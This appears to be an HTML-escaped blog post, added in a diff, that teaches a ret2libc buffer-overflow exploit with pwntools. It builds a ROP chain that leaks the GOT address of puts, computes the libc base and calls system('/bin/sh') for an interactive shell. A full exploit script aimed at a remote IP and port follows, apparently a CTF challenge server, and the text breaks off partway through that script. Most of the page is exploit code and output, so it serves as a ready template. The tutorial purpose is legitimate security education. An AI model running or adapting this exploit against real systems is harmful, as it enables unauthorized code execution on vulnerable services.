+&lt;p&gt;The ret2libc consists of several simple steps:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Leak the libc function&amp;rsquo;s address&lt;/li&gt;
+&lt;li&gt;Calculate the address of libc in memory&lt;/li&gt;
+&lt;li&gt;Redirect the execution flow to the leaked libc function such as &lt;em&gt;system&lt;/em&gt; to execute the &lt;em&gt;/bin/sh&lt;/em&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Notice!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;All steps needs to be performed during single program execution (due to the randomization). For this you need to have 2 vulnerable functions or just call the vulnerable code twice ;)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;pwntools-quick-start&#34;&gt;PWNtools: quick start&lt;/h3&gt;
+&lt;p&gt;We are going to start from loading binaries (binary and libc) into the pwntools:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn
+
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./binary&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;#p = pwn.remote(&amp;#34;138.68.182.108&amp;#34;, 30784)&lt;/span&gt;
+
+pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context(os&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;, arch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;#pwn.context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./binary&amp;#34;&lt;/span&gt;)
+libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;If you want to perform this code remotely then uncomment &lt;code&gt;pwn.remote&lt;/code&gt; (&amp;amp; comment &lt;code&gt;pwn.process&lt;/code&gt;), for debug logs uncomment &lt;code&gt;pwn.context.log_level = &#39;debug&#39;&lt;/code&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Now we can pretty easily use the binaries meta information such us stored symbols, etc.&lt;/p&gt;
+&lt;p&gt;It might happen that vulnerable code is stored behind some menus, for navigation through program you can use several functions:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# receive stdout until this substring&lt;/span&gt;
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;)       &lt;span style=&#34;color:#75715e&#34;&gt;# receive n number of bytes&lt;/span&gt;
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()       &lt;span style=&#34;color:#75715e&#34;&gt;# receive stdout until new line&lt;/span&gt;
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;foo&amp;#39;&lt;/span&gt;)     &lt;span style=&#34;color:#75715e&#34;&gt;# send bytes&lt;/span&gt;
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;foo&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# send &amp;#39;foo\n&amp;#39; (with new line character)&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# optionally use the timeout parameter to wait for output&lt;/span&gt;
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;leak-address&#34;&gt;Leak address&lt;/h2&gt;
+&lt;p&gt;So, now you managed to load the binary, execute it and navigate to vulnerable functionallity.&lt;/p&gt;
+&lt;p&gt;Now it&amp;rsquo;s time to create the payload - the easiest way to achieve it is to use &lt;em&gt;ROP&lt;/em&gt; module&lt;/p&gt;
+&lt;p&gt;In the code below I am constructing the ROP chain which will:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Fill the buffer (32 bytes)&lt;/li&gt;
+&lt;li&gt;Overwrite the saved base pointer on stack (8 bytes)&lt;/li&gt;
+&lt;li&gt;Call &lt;code&gt;puts&lt;/code&gt; to leak GOT puts address&lt;/li&gt;
+&lt;li&gt;Redirect the execution flow to the same, vulnerable function (&lt;em&gt;fill&lt;/em&gt; in my case)&lt;/li&gt;
+&lt;li&gt;Joins the fill bytes with ROP chain&lt;/li&gt;
+&lt;li&gt;Sends the payload&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;fill &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
+rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(elf)
+rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;], [elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;]])
+rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fill&amp;#34;&lt;/span&gt;])
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([fill, rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain()])
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Under the hood of &lt;code&gt;rop.call&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;In different architectures functions are called using specific &lt;em&gt;call conventions&lt;/em&gt;&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;. For example in linux x8664: 1st argument of function is always passed via &lt;code&gt;rdi&lt;/code&gt; registry. If we want to to call the function with argument we need to make sure that argument value is stored in the mentioned registry.&lt;/p&gt;
+&lt;p&gt;For that we create the ROP chain which will:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Jump to the code containing instructions taking the argument from stack and placing it in &lt;code&gt;rdi&lt;/code&gt;  (&lt;code&gt;pop rdi&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;Take address to jump from stack and jump to it (&lt;code&gt;ret&lt;/code&gt;).&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In general &lt;code&gt;rop.call&lt;/code&gt; chain will look like that:&lt;code&gt;&amp;lt;pop rdi; ret addr&amp;gt; &amp;lt;arg&amp;gt; &amp;lt;func_addr&amp;gt;&lt;/code&gt; (pwntools is capable of finding gadgets needed to call the function will all arguments).&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;PLT vs GOT&lt;/strong&gt;&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PLT - Procedure Linkage Table, contain stubs to jump to the target&lt;/li&gt;
+&lt;li&gt;GOT - tables of the target addresses (resolved runtime)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;You can find these values by yourself:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ objdump -D ./binary| grep puts
+&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000400650&lt;/span&gt; &amp;lt;puts@plt&amp;gt;:
+  400650:       ff &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;       jmpq   *0x201952&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%rip&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 601fa8 &amp;lt;puts@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can interpret above output as:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PLT address = &lt;code&gt;0x400650&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;GOT entry = &lt;code&gt;0x601fa8&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;After sending such prepared payload to the program the stack should look like that:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;+----------------+
+|  ptr_plt_puts  |   &amp;lt;- pointer to puts function which will be executed
++----------------+
+|  ptr_got_puts  |   &amp;lt;- address to entry of puts in GOT, value will be printed by puts above
++----------------+
+|   ptr_poprdi   |   &amp;lt;- pointer to pop rdi; ret
++----------------+
+|                |
+|      fill      |   &amp;lt;- our &amp;quot;fill&amp;quot;, which just overflows the buffer and saved rbp
+|     (A*40)     |
+|                |
++----------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now we need to parse the output, this part is individual for each program. I really recommend enabling debugging output which will show transfered data.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Protip - Enable Debug Mode&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# parse leaked address&lt;/span&gt;
+raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()  &lt;span style=&#34;color:#75715e&#34;&gt;# \&lt;/span&gt;
+raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:]     &lt;span style=&#34;color:#75715e&#34;&gt;# - skip unnecesary data&lt;/span&gt;
+
+leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fill missing bytes with zeroes&lt;/span&gt;
+leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(leaked_puts)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Packing and Unpacking the bytes&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;pwntools contains built-in functions for &lt;strong&gt;p&lt;/strong&gt;acking and &lt;strong&gt;u&lt;/strong&gt;npacking bytes - conversion of bytes between the strings and ints according to set environment with &lt;code&gt;context&lt;/code&gt; function (endianness is set automatically).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4142424245464748&lt;/span&gt;)
+&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HGFEBBBA&amp;#39;&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HEXIFYIT&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#ae81ff&#34;&gt;6073483730898928968&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# 0x5449594649584548&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;run-binsh&#34;&gt;Run /bin/sh&lt;/h2&gt;
+&lt;p&gt;The &amp;ldquo;last&amp;rdquo; step consists of the following substeps:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Calculate the address of libc in memory&lt;/li&gt;
+&lt;li&gt;Calculate the address of &lt;code&gt;system()&lt;/code&gt; function and its argument (&lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Prepare the ropchain &amp;amp; pass it as argument&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Ok, but why?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;You might  wondering here why not just call the &lt;code&gt;system()&lt;/code&gt; directly in the previous step. It seems to be might simpler, than whole play with calling the same function once again.&lt;/p&gt;
+&lt;p&gt;The reason is simple: there is no &lt;code&gt;system&lt;/code&gt; plt entry in our binary, so we can&amp;rsquo;t call it:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ objdump -D ./binary| grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# empty output&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We don&amp;rsquo;t have it in our binary, so we need to find it in the memory by tracing common functions - in our case &lt;code&gt;puts&lt;/code&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Stage 2, ret2shell&amp;#34;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;# calculate offset, base address of the libc in the memory&lt;/span&gt;
+libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# prepare the final payload&lt;/span&gt;
+rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(libc)
+rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_gadget([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ret&amp;#39;&lt;/span&gt;])) &lt;span style=&#34;color:#75715e&#34;&gt;# just for fixing padding, you might not need it&lt;/span&gt;
+rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;], [next(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))]) &lt;span style=&#34;color:#75715e&#34;&gt;# with null-byte to make sure that we don&amp;#39;t try to execute some /bin/sh appended with garbage like &amp;#39;/bin/shFEFE&amp;#39; which obviously doesn&amp;#39;t exists in linux&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([fill, rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain()])
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The last line (&lt;code&gt;p.interactive()&lt;/code&gt;) spawns the interactive shell:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ ps
+  PID TTY          TIME CMD
+   &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; ?        00:00:00 binary
+   &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; ?        00:00:00 sh
+   &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; ?        00:00:00 sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;full-script&#34;&gt;Full script&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#p = pwn.process(&amp;#39;./binary&amp;#39;)&lt;/span&gt;
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;138.68.182.108&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30784&lt;/span&gt;)
+
+pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context(os&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;, arch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;#pwn.context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./binary&amp;#34;&lt;/span&gt;)
+libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;)
+
+pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Stage 1, leak puts addr&amp;#34;&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# prepare payload&lt;/span&gt;
+fill &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
+rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(elf)
+rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;], [elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;]])
+rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fill&amp;#34;&lt;/span&gt;])
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([fill, rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain()])
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enjoy your &amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# extract leaked puts address&lt;/span&gt;
+raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()  &lt;span style=&#34;color:#75715e&#34;&gt;# \&lt;/span&gt;
+raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:]     &lt;span style=&#34;color:#75715e&#34;&gt;# - skip unnecesary data&lt;/span&gt;
+
